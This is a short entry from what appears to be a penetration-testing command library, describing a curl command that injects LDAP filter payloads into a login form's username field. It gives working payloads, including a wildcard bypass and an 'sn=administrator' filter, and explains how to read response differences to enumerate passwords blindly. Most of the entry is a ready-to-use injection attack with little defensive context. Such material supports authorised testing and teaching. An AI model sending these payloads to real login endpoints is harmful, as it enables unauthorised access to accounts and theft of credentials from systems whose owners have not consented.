---
id: 3a71a035-c9a2-4340-bfcf-58f3be1f5763
name: curl-inject-ldap-filter
type: command
executor: bash
data: curl -X POST $_URL -d "username=$_INJECTION_PAYLOAD&password=$_DUMMY_PASS" -v
output: null
created_at: '2023-04-06T03:56:01.631504+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - web-injection
  - ldap
verified: true
validated: true
---

# curl-inject-ldap-filter

## Command

```bash
curl -X POST $_URL -d "username=$_INJECTION_PAYLOAD&password=$_DUMMY_PASS" -v
```

## Description

This command uses curl to send a POST request to a login endpoint, injecting an LDAP filter payload into the username field to test for blind injection vulnerabilities. It helps enumerate LDAP data by observing response differences (e.g., success vs. failure).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_URL | Target login endpoint URL (e.g., http://target.com/login) | Yes |
| $_INJECTION_PAYLOAD | LDAP filter to inject (e.g., *)(sn=administrator)(password=*) ) | Yes |
| $_DUMMY_PASS | Dummy password value to complete the form (e.g., dummy) | Yes |
| -X POST | Specify POST method | Built-in |
| -d | Data to send in the POST body | Built-in |
| -v | Verbose output for debugging responses | No |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/login -d "username=*&password=dummy" -v
```

### Advanced Usage

```bash
curl -X POST http://target.com/login -d "username=*)(sn=administrator)(password=MYKE)&password=dummy" -v
```

## Expected Output

Successful injection might return HTTP 200 with a login success indicator (e.g., "Welcome" in body or redirect), while failure returns 401/403 or error page. Look for differences in response size, time, or content to infer boolean results (OK/KO).

## Related

- [[procedures/Blind-LDAP-Injection-for-Password-Enumeration]]
- [[tools/Burp-Suite]] (for automating injections)
